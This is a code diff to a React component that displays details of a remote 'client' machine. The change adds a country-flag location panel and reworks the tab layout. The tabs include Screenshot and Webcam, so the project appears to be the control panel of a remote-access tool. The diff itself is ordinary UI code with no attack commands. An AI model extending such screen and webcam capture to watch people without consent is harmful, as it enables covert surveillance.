@@ -19,6 +19,7 @@ import {
   IconCameraPlus,
   IconVideo,
   IconRefresh,
+  IconMapPin,
 } from "@tabler/icons-react";
 
 export const ClientInfo = ({
@@ -99,62 +100,73 @@ export const ClientInfo = ({
     }
   };
 
+  // Get country flag SVG path based on country code
+  const getCountryFlagPath = (countryCode: string) => {
+    if (!countryCode || countryCode === "N/A") return "";
+
+    const code = countryCode.toLowerCase();
+    return `/country_flags/${code}.svg`;
+  };
+
   return (
-    <div className="relative bg-secondarybg p-4 rounded-xl text-white h-full flex flex-col">
-      {/* Header */}
-      <div className="flex justify-between items-center mb-4 border-b border-gray-700 pb-3">
-        <h2 className="text-xl font-bold flex items-center gap-2">
-          {getOsIcon()}
-          <span className="truncate">{client.hostname}</span>
-        </h2>
-        <button
-          onClick={onClose}
-          className="text-accentx hover:text-white transition cursor-pointer"
-          aria-label="Close details"
-        >
-          <IconSquareRoundedX size={28} />
-        </button>
+    <div className="relative bg-secondarybg p-4 rounded-xl text-white h-full flex flex-col max-h-full">
+      {/* Header and Tabs are fixed */}
+      <div className="flex-none z-10">
+        {/* Header */}
+        <div className="flex justify-between items-center mb-4 border-b border-gray-700 pb-3">
+          <h2 className="text-xl font-bold flex items-center gap-2">
+            {getOsIcon()}
+            <span className="truncate">{client.hostname}</span>
+          </h2>
+          <button
+            onClick={onClose}
+            className="text-accentx hover:text-white transition cursor-pointer"
+            aria-label="Close details"
+          >
+            <IconSquareRoundedX size={28} />
+          </button>
+        </div>
+
+        {/* Tabs */}
+        <div className="flex mb-4 border-b border-gray-700">
+          <button
+            className={`py-2 px-4 flex items-center gap-1 cursor-pointer ${
+              activeSection === "system"
+                ? "text-white border-b-2 border-accentx"
+                : "text-gray-400 hover:text-white"
+            }`}
+            onClick={() => setActiveSection("system")}
+          >
+            <IconServer size={16} />
+            <span>System</span>
+          </button>
+          <button
+            className={`py-2 px-4 flex items-center gap-1 cursor-pointer ${
+              activeSection === "screenshot"
+                ? "text-white border-b-2 border-accentx"
+                : "text-gray-400 hover:text-white"
+            }`}
+            onClick={() => setActiveSection("screenshot")}
+          >
+            <IconCamera size={16} />
+            <span>Screenshot</span>
+          </button>
+          <button
+            className={`py-2 px-4 flex items-center gap-1 cursor-pointer ${
+              activeSection === "webcam"
+                ? "text-white border-b-2 border-accentx"
+                : "text-gray-400 hover:text-white"
+            }`}
+            onClick={() => setActiveSection("webcam")}
+          >
+            <IconVideo size={16} />
+            <span>Webcam</span>
+          </button>
+        </div>
       </div>
 
-      {/* Tabs */}
-      <div className="flex mb-4 border-b border-gray-700">
-        <button
-          className={`py-2 px-4 flex items-center gap-1 cursor-pointer ${
-            activeSection === "system"
-              ? "text-white border-b-2 border-accentx"
-              : "text-gray-400 hover:text-white"
-          }`}
-          onClick={() => setActiveSection("system")}
-        >
-          <IconServer size={16} />
-          <span>System</span>
-        </button>
-        <button
-          className={`py-2 px-4 flex items-center gap-1 cursor-pointer ${
-            activeSection === "screenshot"
-              ? "text-white border-b-2 border-accentx"
-              : "text-gray-400 hover:text-white"
-          }`}
-          onClick={() => setActiveSection("screenshot")}
-        >
-          <IconCamera size={16} />
-          <span>Screenshot</span>
-        </button>
-        <button
-          className={`py-2 px-4 flex items-center gap-1 cursor-pointer ${
-            activeSection === "webcam"
-              ? "text-white border-b-2 border-accentx"
-              : "text-gray-400 hover:text-white"
-          }`}
-          onClick={() => setActiveSection("webcam")}
-        >
-          <IconVideo size={16} />
-          <span>Webcam</span>
-        </button>
-      </div>
-
-      {/* Main content */}
-      <div className="flex-1 overflow-y-auto">
+      {/* Main content - absolute positioning with a fixed height */}
+      <div className="absolute top-[121px] left-4 right-4 bottom-4 overflow-y-auto">
         {activeSection === "system" && (
           <div className="space-y-4">
             {/* Connection info */}
@@ -195,6 +207,33 @@ export const ClientInfo = ({
                       </>
                     ) : (
                       <span className="text-gray-300">Standard User</span>
+                    )}
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            {/* Location info */}
+            <div className="bg-primarybg rounded-lg p-3">
+              <h3 className="text-accentx font-semibold mb-2 text-sm flex items-center gap-1">
+                <IconMapPin size={16} />
+                <span>LOCATION</span>
+              </h3>
+              <div className="grid grid-cols-3 gap-3">
+                <div>
+                  <div className="text-xs text-gray-400">Country</div>
+                  <div className="text-sm">
+                    {client.country_code && client.country_code !== "N/A" ? (
+                      <div className="flex items-center gap-2">
+                        <img
+                          src={getCountryFlagPath(client.country_code)}
+                          alt={client.country_code}
+                          className="w-6 h-4 object-cover"
+                        />
+                        <span>{client.country_code}</span>
+                      </div>
+                    ) : (
+                      "N/A"
                     )}
                   </div>
                 </div>
